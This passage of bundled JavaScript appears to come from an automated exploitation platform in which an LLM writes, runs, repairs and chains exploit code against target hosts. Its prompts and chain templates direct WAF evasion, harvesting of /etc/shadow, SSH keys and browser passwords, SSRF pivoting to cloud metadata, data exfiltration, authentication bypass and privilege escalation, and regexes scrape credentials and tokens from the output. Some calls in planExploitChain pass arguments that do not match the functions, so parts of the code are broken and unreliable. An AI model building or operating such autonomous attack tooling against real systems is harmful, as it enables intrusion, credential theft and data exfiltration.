      messages: [
        {
          role: "system",
          content: `You are an expert exploit developer. Given a failed exploit script and error analysis, generate a corrected version that addresses the identified issues.

RULES:
1. Output ONLY the corrected ${originalRequest.language} code \u2014 no explanations, no markdown fences
2. Keep the same overall approach but fix the specific issues identified
3. If WAF was detected, apply appropriate encoding/evasion techniques
4. Add error handling for common failure modes
5. Preserve any existing verification/callback mechanisms
${wafContext}`
        },
        {
          role: "user",
          content: `Fix this failed exploit script.

ORIGINAL CODE:
${(originalRequest.code || "").slice(0, 4e3)}

ERROR ANALYSIS:
Type: ${errorAnalysis.errorType}
Root Cause: ${errorAnalysis.rootCause}
Suggested Fixes: ${errorAnalysis.suggestedFixes.join("; ")}
Payload Adjustments: ${errorAnalysis.payloadAdjustments.join("; ")}

FAILED OUTPUT:
stdout: ${failedResult.stdout?.slice(-1e3) || "(empty)"}
stderr: ${failedResult.stderr?.slice(-500) || "(empty)"}

Generate the corrected ${originalRequest.language} code:`
        }
      ]
    });
    const correctedCode = response.choices[0].message.content?.trim();
    if (!correctedCode || correctedCode.length < 20) return null;
    return correctedCode.replace(/^```(?:python|bash|ruby)?\n?/gm, "").replace(/\n?```$/gm, "").trim();
  } catch (err) {
    console.error(`[IterativeLoop] Failed to generate corrected exploit: ${err.message}`);
    return null;
  }
}
function isBetterResult(a, b) {
  const aVerified = a.verification?.status === "confirmed_success" || a.verification?.status === "probable_success";
  const bVerified = b.verification?.status === "confirmed_success" || b.verification?.status === "probable_success";
  if (aVerified && !bVerified) return true;
  if (!aVerified && bVerified) return false;
  if (a.verification && b.verification) {
    return a.verification.confidence > b.verification.confidence;
  }
  if (a.exploitResult.exitCode === 0 && b.exploitResult.exitCode !== 0) return true;
  if (a.exploitResult.exitCode !== 0 && b.exploitResult.exitCode === 0) return false;
  return (a.exploitResult.stdout?.length || 0) > (b.exploitResult.stdout?.length || 0);
}
function buildSummary(attempts, succeeded, totalDurationMs) {
  const parts = [];
  parts.push(`${attempts.length} attempt(s) in ${(totalDurationMs / 1e3).toFixed(1)}s`);
  if (succeeded) {
    const successAttempt = attempts.find(
      (a) => a.verification?.status === "confirmed_success" || a.verification?.status === "probable_success" || a.exploitResult.status === "success" && a.exploitResult.exitCode === 0
    );
    parts.push(`Succeeded on attempt ${successAttempt?.attemptNumber || "?"}`);
  } else {
    const errorTypes = [...new Set(attempts.map((a) => a.errorAnalysis?.errorType).filter(Boolean))];
    parts.push(`Failed \u2014 error types: ${errorTypes.join(", ") || "unknown"}`);
  }
  return parts.join(" | ");
}
function createIterativeLoop(config = {}) {
  return {
    async execute(code, language, engagementId, exploitId, timeoutSeconds) {
      const numericEngagementId = typeof engagementId === "string" ? parseInt(engagementId, 10) || 0 : engagementId;
      const request = {
        code,
        language,
        exploitId,
        targetHost: config.targetHost || "unknown",
        targetPort: config.targetPort || 80,
        timeoutSeconds: timeoutSeconds || config.timeoutSeconds || 120
      };
      const iterConfig = {
        ...config,
        vulnClass: config.vulnClass || "generic",
        maxAttempts: config.maxAttempts || 5
      };
      return executeWithIterativeRetry(numericEngagementId, request, iterConfig);
    }
  };
}
var DEFAULT_CONFIG2, ERROR_ANALYSIS_SCHEMA;
var init_iterative_exploit_loop = __esm({
  "server/lib/iterative-exploit-loop.ts"() {
    "use strict";
    init_exploit_sandbox();
    init_exploit_verification_engine();
    init_payload_encoding_engine();
    init_waf_detector();
    DEFAULT_CONFIG2 = {
      maxAttempts: 5,
      attemptDelayMs: 2e3,
      enableWafAdaptation: true,
      enableLLMErrorAnalysis: true,
      vulnClass: "generic",
      stopOnSuccess: true,
      enableVerification: true,
      targetHost: "",
      targetPort: void 0
    };
    ERROR_ANALYSIS_SCHEMA = {
      type: "json_schema",
      json_schema: {
        name: "exploit_error_analysis",
        strict: true,
        schema: {
          type: "object",
          properties: {
            error_type: {
              type: "string",
              enum: ["syntax_error", "connection_error", "auth_error", "waf_block", "timeout", "dependency_missing", "logic_error", "target_patched", "unknown"]
            },
            root_cause: { type: "string" },
            suggested_fixes: { type: "array", items: { type: "string" } },
            payload_adjustments: { type: "array", items: { type: "string" } },
            should_retry: { type: "boolean" },
            confidence: { type: "number" }
          },
          required: ["error_type", "root_cause", "suggested_fixes", "payload_adjustments", "should_retry", "confidence"],
          additionalProperties: false
        }
      }
    };
  }
});

// server/lib/exploit-chain-planner.ts
function isAccessSufficient(current, required) {
  return ACCESS_HIERARCHY[current] >= ACCESS_HIERARCHY[required];
}
function getHigherAccess(a, b) {
  return ACCESS_HIERARCHY[a] >= ACCESS_HIERARCHY[b] ? a : b;
}
function buildVerticalEscalationChain(engagementId, targetHost, targetPort, startingVuln) {
  return {
    id: `chain-vert-${Date.now().toString(36)}`,
    type: "vertical_escalation",
    name: `Vertical Escalation via ${startingVuln.title}`,
    targetHost,
    targetPort,
    engagementId,
    steps: [
      {
        id: "step-1-initial",
        name: "Initial Exploitation",
        objective: `Exploit ${startingVuln.title} to gain initial foothold`,
        requiresAccess: "none",
        targetAccess: "info_disclosure",
        vulnClass: startingVuln.type,
        maxAttempts: 5,
        optional: false,
        timeoutSec: 120,
        exploitPrompt: `Generate an exploit for ${startingVuln.title}${startingVuln.cve ? ` (${startingVuln.cve})` : ""} targeting ${targetHost}:${targetPort}. Goal: establish initial access and gather information about the target.`
      },
      {
        id: "step-2-enumerate",
        name: "Post-Exploitation Enumeration",
        objective: "Enumerate the target system for escalation paths",
        requiresAccess: "info_disclosure",
        targetAccess: "file_read",
        vulnClass: startingVuln.type,
        maxAttempts: 3,
        optional: false,
        timeoutSec: 90,
        exploitPrompt: "Using the foothold from the previous step, enumerate the target: read /etc/passwd, check SUID binaries, list running services, check sudo permissions, find config files with credentials."
      },
      {
        id: "step-3-credentials",
        name: "Credential Harvesting",
        objective: "Extract credentials for privilege escalation",
        requiresAccess: "file_read",
        targetAccess: "credential_access",
        vulnClass: "cmdi",
        maxAttempts: 3,
        optional: true,
        timeoutSec: 90,
        exploitPrompt: "Using file read access, extract credentials: check /etc/shadow, database config files, .env files, SSH keys, browser saved passwords, and application config files."
      },
      {
        id: "step-4-privesc",
        name: "Privilege Escalation",
        objective: "Escalate to root/admin access",
        requiresAccess: "command_execution",
        targetAccess: "root_shell",
        vulnClass: "cmdi",
        maxAttempts: 5,
        optional: true,
        timeoutSec: 120,
        exploitPrompt: "Using the credentials and enumeration data from previous steps, attempt privilege escalation. Try: sudo exploits, SUID binary abuse, kernel exploits, cron job manipulation, or service misconfigurations."
      }
    ],
    config: DEFAULT_CHAIN_CONFIG
  };
}
function buildServiceChain(engagementId, targetHost, targetPort, ssrfEndpoint) {
  return {
    id: `chain-svc-${Date.now().toString(36)}`,
    type: "service_chain",
    name: `Service Chain via SSRF at ${ssrfEndpoint}`,
    targetHost,
    targetPort,
    engagementId,
    steps: [
      {
        id: "step-1-ssrf",
        name: "SSRF Exploitation",
        objective: "Exploit SSRF to access internal services",
        requiresAccess: "none",
        targetAccess: "info_disclosure",
        vulnClass: "ssrf",
        maxAttempts: 5,
        optional: false,
        timeoutSec: 90,
        exploitPrompt: `Exploit the SSRF vulnerability at ${ssrfEndpoint} on ${targetHost}:${targetPort}. Scan internal network ranges (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) for common services (Redis:6379, Elasticsearch:9200, MongoDB:27017, Memcached:11211, Docker:2375).`
      },
      {
        id: "step-2-internal-enum",
        name: "Internal Service Enumeration",
        objective: "Enumerate discovered internal services",
        requiresAccess: "info_disclosure",
        targetAccess: "database_access",
        vulnClass: "ssrf",
        maxAttempts: 3,
        optional: false,
        timeoutSec: 90,
        exploitPrompt: "Using the SSRF, interact with discovered internal services. Extract data from Redis (KEYS *, GET), Elasticsearch (_cat/indices, _search), MongoDB (listDatabases), or cloud metadata (169.254.169.254)."
      },
      {
        id: "step-3-data-exfil",
        name: "Data Exfiltration",
        objective: "Extract sensitive data from internal services",
        requiresAccess: "database_access",
        targetAccess: "credential_access",
        vulnClass: "ssrf",
        maxAttempts: 3,
        optional: true,
        timeoutSec: 120,
        exploitPrompt: "Using access to internal services, extract sensitive data: database credentials, API keys, cloud IAM tokens, session tokens, or configuration secrets."
      }
    ],
    config: DEFAULT_CHAIN_CONFIG
  };
}
function buildAuthBypassChain(engagementId, targetHost, targetPort, authEndpoint) {
  return {
    id: `chain-auth-${Date.now().toString(36)}`,
    type: "auth_bypass",
    name: `Auth Bypass Chain targeting ${authEndpoint}`,
    targetHost,
    targetPort,
    engagementId,
    steps: [
      {
        id: "step-1-recon",
        name: "Authentication Reconnaissance",
        objective: "Identify authentication mechanism and weaknesses",
        requiresAccess: "none",
        targetAccess: "info_disclosure",
        vulnClass: "generic",
        maxAttempts: 3,
        optional: false,
        timeoutSec: 60,
        exploitPrompt: `Analyze the authentication mechanism at ${authEndpoint} on ${targetHost}:${targetPort}. Identify: JWT/session token format, password reset flow, OAuth endpoints, API key patterns, default credentials, and error message information leaks.`
      },
      {
        id: "step-2-bypass",
        name: "Authentication Bypass",
        objective: "Bypass authentication to gain access",
        requiresAccess: "info_disclosure",
        targetAccess: "service_account",
        vulnClass: "sqli",
        maxAttempts: 5,
        optional: false,
        timeoutSec: 120,
        exploitPrompt: "Using the authentication analysis, attempt bypass: SQL injection in login, JWT none algorithm, JWT secret brute force, IDOR on user endpoints, password reset token prediction, or default credentials."
      },
      {
        id: "step-3-admin",
        name: "Admin Privilege Escalation",
        objective: "Escalate to admin role",
        requiresAccess: "service_account",
        targetAccess: "command_execution",
        vulnClass: "generic",
        maxAttempts: 3,
        optional: true,
        timeoutSec: 90,
        exploitPrompt: "Using the authenticated session, escalate to admin: modify role parameter in JWT/request, access admin endpoints, exploit mass assignment vulnerabilities, or use IDOR to access admin resources."
      }
    ],
    config: DEFAULT_CHAIN_CONFIG
  };
}
async function executeChain(chain) {
  const startTime = Date.now();
  const stepResults = [];
  let currentFoothold = createEmptyFoothold();
  let highestAccess = "none";
  console.log(`[ChainPlanner] Starting chain: ${chain.name} (${chain.steps.length} steps)`);
  for (const step of chain.steps) {
    if (Date.now() - startTime > chain.config.maxChainDurationSec * 1e3) {
      console.log(`[ChainPlanner] Chain timeout reached after ${(Date.now() - startTime) / 1e3}s`);
      break;
    }
    if (!isAccessSufficient(highestAccess, step.requiresAccess) && step.requiresAccess !== "none") {
      console.log(`[ChainPlanner] Skipping step "${step.name}" \u2014 requires ${step.requiresAccess}, have ${highestAccess}`);
      if (!step.optional && chain.config.stopOnFailure) {
        stepResults.push({
          step,
          success: false,
          achievedAccess: highestAccess,
          footholdContext: currentFoothold,
          durationMs: 0,
          error: `Insufficient access: requires ${step.requiresAccess}, have ${highestAccess}`
        });
        break;
      }
      continue;
    }
    console.log(`[ChainPlanner] Executing step: ${step.name} (target: ${step.targetAccess})`);
    const stepStart = Date.now();
    try {
      let exploitRequest = step.exploitRequest;
      if (!exploitRequest && step.exploitPrompt && chain.config.enableLLMStepGeneration) {
        exploitRequest = await generateStepExploit(step, currentFoothold, chain);
      }
      if (!exploitRequest) {
        stepResults.push({
          step,
          success: false,
          achievedAccess: highestAccess,
          footholdContext: currentFoothold,
          durationMs: Date.now() - stepStart,
          error: "No exploit code available for this step"
        });
        if (!step.optional && chain.config.stopOnFailure) break;
        continue;
      }
      const iterResult = await executeWithIterativeRetry(chain.engagementId, exploitRequest, {
        maxAttempts: step.maxAttempts,
        targetHost: chain.targetHost,
        targetPort: chain.targetPort,
        vulnClass: step.vulnClass,
        enableVerification: true,
        enableLLMErrorAnalysis: true,
        enableWafAdaptation: true
      });
      if (iterResult.succeeded && iterResult.bestResult) {
        currentFoothold = updateFoothold(
          currentFoothold,
          iterResult.bestResult.exploitResult,
          iterResult.bestResult.verification
        );
        const achievedAccess = iterResult.bestResult.verification?.accessLevel || step.targetAccess;
        highestAccess = getHigherAccess(highestAccess, achievedAccess);
      }
      stepResults.push({
        step,
        success: iterResult.succeeded,
        iterativeResult: iterResult,
        achievedAccess: highestAccess,
        footholdContext: { ...currentFoothold },
        durationMs: Date.now() - stepStart
      });
      if (!iterResult.succeeded && !step.optional && chain.config.stopOnFailure) {
        console.log(`[ChainPlanner] Required step "${step.name}" failed \u2014 stopping chain`);
        break;
      }
    } catch (err) {
      console.error(`[ChainPlanner] Step "${step.name}" threw error: ${err.message}`);
      stepResults.push({
        step,
        success: false,
        achievedAccess: highestAccess,
        footholdContext: currentFoothold,
        durationMs: Date.now() - stepStart,
        error: err.message
      });
      if (!step.optional && chain.config.stopOnFailure) break;
    }
    if (chain.config.stepDelayMs > 0) {
      await new Promise((r) => setTimeout(r, chain.config.stepDelayMs));
    }
  }
  const totalDurationMs = Date.now() - startTime;
  const overallSuccess = stepResults.some((r) => r.success);
  return {
    chain,
    overallSuccess,
    stepResults,
    finalFoothold: currentFoothold,
    highestAccess,
    totalDurationMs,
    summary: buildChainSummary(chain, stepResults, highestAccess, totalDurationMs)
  };
}
async function generateStepExploit(step, foothold, chain) {
  const { invokeLLM } = await import("./llm-YH2E5SAK.js");
  const footholdContext = foothold.accessLevel !== "none" ? `
CURRENT FOOTHOLD:
- Access Level: ${foothold.accessLevel}
- Current User: ${foothold.currentUser || "unknown"}
- Current Host: ${foothold.currentHost || chain.targetHost}
- Credentials Found: ${foothold.credentials.map((c) => `${c.username}:${c.type}`).join(", ") || "none"}
- Files Read: ${foothold.filesRead.map((f) => f.path).join(", ") || "none"}
- Internal IPs: ${foothold.internalIps.join(", ") || "none"}
- Tokens: ${foothold.tokens.map((t) => `${t.type}:${t.value.slice(0, 20)}...`).join(", ") || "none"}
- Last Output (truncated): ${foothold.lastOutput.slice(0, 500)}
` : "No existing foothold \u2014 this is the initial exploitation step.";
  try {
    const response = await invokeLLM({
      _caller: "exploit-chain-planner:generateStepExploit",
      messages: [
        {
          role: "system",
          content: `You are an expert penetration tester generating exploit code for a multi-step attack chain. 
Output ONLY valid Python code \u2014 no explanations, no markdown fences.
The code must be self-contained and executable with python3.
Include proper error handling and output formatting.
Print results clearly so they can be parsed by the verification engine.`
        },
        {
          role: "user",
          content: `Generate exploit code for this chain step:

STEP: ${step.name}
OBJECTIVE: ${step.objective}
TARGET: ${chain.targetHost}:${chain.targetPort || 80}
VULN CLASS: ${step.vulnClass}

${step.exploitPrompt}

${footholdContext}

Generate the Python exploit code:`
        }
      ]
    });
    const code = response.choices[0].message.content?.trim().replace(/^```(?:python)?\n?/gm, "").replace(/\n?```$/gm, "").trim();
    if (!code || code.length < 30) return null;
    return {
      exploitId: `chain-${chain.id}-${step.id}`,
      code,
      language: "python",
      targetHost: chain.targetHost,
      targetPort: chain.targetPort,
      timeoutSeconds: step.timeoutSec,
      vulnerabilityTitle: step.name,
      attackTechnique: step.objective
    };
  } catch (err) {
    console.error(`[ChainPlanner] Failed to generate step exploit: ${err.message}`);
    return null;
  }
}
function createEmptyFoothold() {
  return {
    accessLevel: "none",
    credentials: [],
    filesRead: [],
    networkInfo: [],
    tokens: [],
    commandHistory: [],
    internalIps: [],
    lastOutput: ""
  };
}
function updateFoothold(current, execResult, verification) {
  const updated = { ...current };
  const output = execResult.stdout || "";
  if (verification?.accessLevel) {
    updated.accessLevel = getHigherAccess(updated.accessLevel, verification.accessLevel);
  }
  const credPatterns = [
    /(?:username|user|login)[\s:=]+([^\s:]+)[\s:]+(?:password|pass|pwd)[\s:=]+([^\s]+)/gi,
    /([a-zA-Z0-9._-]+):(\$[0-9a-z]+\$[^\s:]+)/gi
    // Hash format
  ];
  for (const pattern of credPatterns) {
    let match;
    while ((match = pattern.exec(output)) !== null) {
      updated.credentials.push({
        username: match[1],
        password: match[2]?.startsWith("$") ? void 0 : match[2],
        hash: match[2]?.startsWith("$") ? match[2] : void 0,
        type: match[2]?.startsWith("$") ? "hash" : "plaintext"
      });
    }
  }
  const ipPattern = /(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/g;
  let ipMatch;
  while ((ipMatch = ipPattern.exec(output)) !== null) {
    if (!updated.internalIps.includes(ipMatch[0])) {
      updated.internalIps.push(ipMatch[0]);
    }
  }
  const jwtPattern = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
  let jwtMatch;
  while ((jwtMatch = jwtPattern.exec(output)) !== null) {
    updated.tokens.push({ type: "jwt", value: jwtMatch[0] });
  }
  if (verification?.verificationCommands) {
    for (const cmd of verification.verificationCommands) {
      if (cmd.matched) {
        if (cmd.command === "whoami") updated.currentUser = cmd.actualOutput.trim();
        if (cmd.command === "hostname") updated.currentHost = cmd.actualOutput.trim();
        updated.commandHistory.push({ command: cmd.command, output: cmd.actualOutput });
      }
    }
  }
  updated.lastOutput = output.slice(0, 5e3);
  return updated;
}
function buildChainSummary(chain, stepResults, highestAccess, totalDurationMs) {
  const successSteps = stepResults.filter((r) => r.success).length;
  const totalSteps = stepResults.length;
  const parts = [
    `Chain "${chain.name}": ${successSteps}/${totalSteps} steps succeeded`,
    `Highest access: ${highestAccess}`,
    `Duration: ${(totalDurationMs / 1e3).toFixed(1)}s`
  ];
  for (const result of stepResults) {
    const status = result.success ? "\u2713" : "\u2717";
    parts.push(`  ${status} ${result.step.name}: ${result.achievedAccess}${result.error ? ` (${result.error})` : ""}`);
  }
  return parts.join("\n");
}
async function suggestChainSteps(execResult, verification, targetHost, targetPort, engagementId) {
  const { invokeLLM } = await import("./llm-YH2E5SAK.js");
  try {
    const response = await invokeLLM({
      _caller: "exploit-chain-planner:suggestNextSteps",
      messages: [
        {
          role: "system",
          content: `You are a penetration testing chain planner. Given a successful exploit result, suggest 2-4 logical next steps to escalate access. Return a JSON array of steps.`
        },
        {
          role: "user",
          content: `A successful exploit achieved ${verification.accessLevel} access on ${targetHost}:${targetPort}.

Output: ${execResult.stdout?.slice(0, 2e3)}
Verification: ${verification.explanation}

Suggest next exploitation steps as a JSON array with fields: name, objective, vulnClass, exploitPrompt`
        }
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "chain_suggestions",
          strict: true,
          schema: {
            type: "object",
            properties: {
              steps: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    name: { type: "string" },
                    objective: { type: "string" },
                    vuln_class: { type: "string" },
                    exploit_prompt: { type: "string" }
                  },
                  required: ["name", "objective", "vuln_class", "exploit_prompt"],
                  additionalProperties: false
                }
              }
            },
            required: ["steps"],
            additionalProperties: false
          }
        }
      }
    });
    const parsed = JSON.parse(response.choices[0].message.content || '{"steps":[]}');
    return (parsed.steps || []).map((s, i) => ({
      id: `suggested-${i + 1}`,
      name: s.name,
      objective: s.objective,
      requiresAccess: verification.accessLevel,
      targetAccess: "root_shell",
      vulnClass: s.vuln_class || "generic",
      exploitPrompt: s.exploit_prompt,
      maxAttempts: 3,
      optional: true,
      timeoutSec: 90
    }));
  } catch {
    return [];
  }
}
async function planExploitChain(context) {
  const foothold = {
    currentAccess: context.currentAccess || "none",
    exploitedVuln: context.currentVuln,
    targetHost: context.targetHost,
    targetPort: context.targetPort || 80,
    capturedData: context.exploitOutput ? { stdout: context.exploitOutput } : {},
    engagementId: context.engagementId || "unknown"
  };
  let chain;
  if (context.currentAccess === "user" || context.currentAccess === "low") {
    chain = buildVerticalEscalationChain(foothold);
  } else if (context.currentAccess === "none") {
    chain = buildAuthBypassChain(foothold);
  } else {
    chain = buildServiceChain(foothold);
  }
  try {
    const suggested = await suggestChainSteps(foothold);
    if (suggested.length > 0) {
      chain.steps.push(...suggested);
    }
  } catch {
  }
  return chain;
}
var DEFAULT_CHAIN_CONFIG, ACCESS_HIERARCHY;
var init_exploit_chain_planner = __esm({
  "server/lib/exploit-chain-planner.ts"() {
    init_iterative_exploit_loop();
    DEFAULT_CHAIN_CONFIG = {
      stopOnFailure: true,
      maxChainDurationSec: 600,
      stepDelayMs: 3e3,
      enableLLMStepGeneration: true,
      enableFootholdContext: true
    };
    ACCESS_HIERARCHY = {
      none: 0,
      info_disclosure: 1,
      file_read: 2,
      file_write: 3,
      credential_access: 4,
      database_access: 5,
      service_account: 6,
      command_execution: 7,
      user_shell: 8,
      root_shell: 9
    };
  }
});

export {
  verifyExploitSuccess,
  init_exploit_verification_engine,
  selectEvasionStrategy,
  applyWafEvasion,
  init_payload_encoding_engine,
  createIterativeLoop,
  init_iterative_exploit_loop,
  buildVerticalEscalationChain,
  buildServiceChain,
  buildAuthBypassChain,
  executeChain,
  suggestChainSteps,
  planExploitChain,
  init_exploit_chain_planner
};
